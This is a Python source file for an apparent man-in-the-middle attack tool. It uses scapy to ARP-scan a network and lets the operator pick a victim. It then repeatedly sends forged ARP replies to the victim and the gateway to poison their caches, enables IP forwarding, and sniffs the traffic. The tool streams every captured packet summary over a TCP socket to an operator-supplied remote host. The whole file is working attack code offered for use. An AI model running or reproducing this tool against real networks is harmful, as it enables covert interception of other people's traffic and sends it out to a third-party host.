import os
try:
    from rich.console import Console
except ModuleNotFoundError:
    os.system("pip install --upgrade rich")
    from rich.console import Console

c = Console()

c.print("[*] [green]Installing required modules")
c.print("             - net-tools")
c.print("             - libpcap-dev")
c.print("             - libcap2, libcap2-bin")

os.system("apt-get install -y net-tools libpcap-dev libcap2 libcap2-bin")

try:
    import scapy.all as scapy
except ModuleNotFoundError:
    c.print("[*] [yellow]'scapy' module not found. Installing ... [/yellow]")
    os.system("pip install --upgrade scapy")
    import scapy.all as scapy

import subprocess
import sys
import time
import threading
from typing import List, Dict
from rich.prompt import Prompt
import socket


class MITM:
    def __init__(self, rhost: str, rport: int) -> None:
        self.__current_dir = os.getcwd()
        self.__interfaces_dir = "/sys/class/net"
        self.__ip_range = ""

        self.__rhost = rhost
        self.__rport = rport

    @staticmethod
    def is_sudo_mode() -> None:
        if not 'SUDO_UID' in os.environ.keys():
            c.print("[red]Try running this program with sudo[/red]")
            sys.exit(1)
    
    def _arp_scan(self) -> List[Dict[str, str]]:
        arp_responses = []
        answered_list = scapy.arping(self.__ip_range, verbose=0)[0]
        for res in answered_list:
            arp_responses.append({"ip" : res[1].psrc, "mac" : res[1].hwsrc})
        
        return arp_responses

    def _get_interface_names(self) -> List[str]:
        return os.listdir(self.__interfaces_dir)

    def _match_iface_name(self, row) -> str:
        interface_names = self._get_interface_names()
        for iface in interface_names:
            if iface in row:
                return iface

        return None

    def _gateway_info(self, network_info: List[Dict[str, str]]) -> List[Dict[str, str]]:
        result = subprocess.run(["route", "-n"], capture_output=True) \
                           .stdout.decode() \
                           .split("\n")

        gateways = []
        for iface in network_info:
            for row in result:
                if iface["ip"] in row:
                    iface_name = self._match_iface_name(row)
                    gateways.append({
                        "iface" : iface_name,
                        "ip"    : iface["ip"],
                        "mac"   : iface["mac"]
                    })       

        return gateways

    @staticmethod
    def clients(arp_res    : List[Dict[str, str]], 
                gateway_res: List[Dict[str, str]]) -> List[Dict[str, str]]:
        client_list = []
        for gateway in gateway_res:
            for item in arp_res:
                if gateway['ip'] != item['ip']:
                    client_list.append(item)

        return client_list
    
    @staticmethod
    def allow_ip_forwarding() -> None:
        subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"])
        subprocess.run(["sysctl", "-p", "/etc/sysctl.conf"])

    @staticmethod
    def arp_spoofer(target_ip: str, target_mac: str, spoof_ip: str) -> None:
        pkt = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
        scapy.send(pkt, verbose=False)
    
    @staticmethod
    def send_spoof_packets(gateway_info: Dict[str, str], node_to_spoof: Dict[str,str]):
        while True:
            MITM.arp_spoofer(gateway_info["ip"], gateway_info["mac"], node_to_spoof["ip"])
            MITM.arp_spoofer(node_to_spoof["ip"], node_to_spoof["mac"], gateway_info["ip"])
            time.sleep(3)

    def send_summary(self, x, sock) -> None:
        try:
            summ = x.summary()
            sock.sendall(summ.encode())

        except socket.gaierror:
            c.print(f"[*] [red]Unable to connect with {self.__rhost}:{self.__rport}[/red]")
            c.print("[*] [yellow]Start stdout logging[/yellow]")
            x.summary()

    def packet_sniffer(self, interface: str) -> None:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((self.__rhost, self.__rport))

        packets = scapy.sniff(iface=interface, prn=lambda x: self.send_summary(x, sock))
    
    @staticmethod
    def choose_arp_res(arp_res: List[Dict[str, str]]) -> Dict[str, str]:
        for id, res in enumerate(arp_res):
            c.print("{}\t\t{}\t\t{}".format(id, res['ip'], res['mac']))

        while True:
            try:
                choice = Prompt.ask("[green]Select the ID[/green] ")
                if arp_res[int(choice)]:
                    return int(choice)
                
            except KeyboardInterrupt:
                c.print("[*] [red]Exiting[/red]")
                sys.exit(1)
            except:
                c.print("[yellow]Please enter a valid choice![/yellow]")
    
        return dict()

    def run(self) -> None:
        # Check if the program is ran as sudo user
        self.is_sudo_mode()
        
        # Get the IP range
        ip_range = Prompt.ask(f"[green]Inter a valid IP range[/green] ")
        self.__ip_range = ip_range

        # Allow IP forwarding
        self.allow_ip_forwarding()

        # Do the ARP scan. If there is not connection exit
        arp_res = self._arp_scan()
        if len(arp_res) == 0:
            c.print("[*] [red]No connection[/red]\n[*] [red]Exiting[/red]")
            sys.exit(1)
    
        # Get the list of gateways
        gateways = self._gateway_info(arp_res)
        gateway_info = gateways[0]
        client_info = self.clients(arp_res, gateways)

        if len(client_info) == 0:
            c.print("[*] [red]No clients found when sending the ARP message[/red]")
            c.print("[*] [red]Exiting[/red]")
            sys.exit(1)
            
        # Select the node to spoof
        choice = self.choose_arp_res(client_info)
        node_to_spoof = client_info[choice]

        t1 = threading.Thread(target=self.send_spoof_packets, 
                              args=(gateway_info, node_to_spoof),
                              daemon=True)
        
        t1.start()

        self.packet_sniffer(gateway_info["iface"])


if __name__ == "__main__":
    rhost = Prompt.ask("[green]Type the IP of the remote host[/green] ")
    rport = Prompt.ask("[green]Type the PORT of the remote host[/green] ")
    
    mitm = MITM(rhost=rhost, rport=int(rport))
    mitm.run()